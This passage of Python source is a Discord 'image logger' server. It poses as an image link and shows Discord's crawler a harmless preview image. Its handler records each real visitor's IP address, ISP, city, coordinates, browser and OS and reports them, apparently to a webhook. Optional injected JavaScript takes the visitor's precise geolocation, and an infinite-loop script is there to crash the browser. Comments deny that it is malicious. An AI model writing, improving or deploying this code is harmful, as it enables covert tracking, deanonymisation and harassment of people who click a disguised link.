    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
